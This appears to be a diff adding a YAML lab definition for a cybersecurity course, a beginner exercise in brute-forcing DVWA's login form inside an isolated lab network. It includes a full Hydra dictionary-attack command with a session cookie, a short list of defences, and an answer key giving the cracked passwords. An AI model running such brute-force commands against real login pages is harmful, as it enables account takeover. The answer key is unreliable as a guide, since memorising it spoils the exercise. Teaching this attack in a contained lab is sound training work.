@@ -1,0 +1,38 @@
+id: web-dvwa-bruteforce-001
+version: 1
+title: {uz: "DVWA: parolni bruteforce qilish", ru: "DVWA: перебор паролей", en: "DVWA: Password brute force"}
+description:
+  uz: Hydra yoki skript bilan login formasiga lug'at hujumi qiling.
+  en: Run a dictionary attack against a login form with Hydra or a script.
+category: web-security
+course: web-application-security
+lab_type: offensive
+difficulty: beginner
+duration_minutes: 60
+instructions:
+  uz: |
+    DVWA → **Brute Force** (security: low). Sessiya cookie'ni oling va:
+    ```bash
+    hydra -l pablo -P /usr/share/wordlists/rockyou.txt <ip> http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=...; security=low"
+    ```
+    Himoya: urinishlar chegarasi, CAPTCHA, MFA, sekinlashtirish.
+machines:
+  - {name: attacker, template: kali-linux, role: attacker}
+  - {name: dvwa, template: dvwa, role: target}
+networks: [{name: lab, type: isolated}]
+topology: {reveal: full}
+tasks:
+  - id: pablo
+    title: {uz: "pablo foydalanuvchisining paroli", en: "Password of user pablo"}
+    points: 60
+    validation: {type: answer, answers: ["letmein"]}
+  - id: smithy
+    title: {uz: "smithy foydalanuvchisining paroli", en: "Password of user smithy"}
+    points: 20
+    validation: {type: answer, answers: ["password"]}
+  - id: defense
+    title: {uz: "Bruteforce'ga qarshi 2 ta chora", en: "Two brute-force mitigations"}
+    points: 20
+    validation: {type: manual}
+scoring: {maximum: 100, passing: 60, xp: 120}
